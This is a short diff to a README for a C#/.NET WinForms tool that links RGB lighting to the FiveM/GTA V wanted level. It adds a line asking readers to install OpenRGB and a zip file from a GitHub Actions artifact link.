@@ -1,5 +1,12 @@
 # FiveM Wanted Lighting
 
+ Please Install OpenRGB and The Zip File below!!!
+ 
+Download: https://github.com/BunnY-sky/FiveMWanted/actions/runs/37712598547/artifacts/11522760735
+OpenRGB: https://openrgb.org/
+
+
+
 External C# / .NET WinForms application for controlling RGB lighting based on the FiveM/GTA V wanted level.
 
 ## Features
